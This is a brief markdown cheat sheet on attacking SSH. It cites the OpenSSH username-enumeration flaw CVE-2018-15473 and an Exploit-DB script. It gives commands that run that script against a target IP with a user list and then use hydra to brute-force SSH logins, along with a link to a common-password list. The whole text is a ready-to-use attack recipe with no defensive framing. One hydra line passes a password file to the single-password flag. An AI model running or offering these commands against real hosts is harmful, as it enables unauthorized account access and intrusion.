# Brute Force
Enumeration CVE 2018-15473
Bug OpenSSH 2.3
https://www.exploit-db.com/exploits/45233

Setup :
---
```
python 45233.py --userList user.txt [ip target] --outputFile hasil.txt
hydra -l [username] -p password.txt [ip target] ssh
hydra -L user.txt -P password.txt [ip target] ssh

https://nordpass.com/most-common-password-list/
```
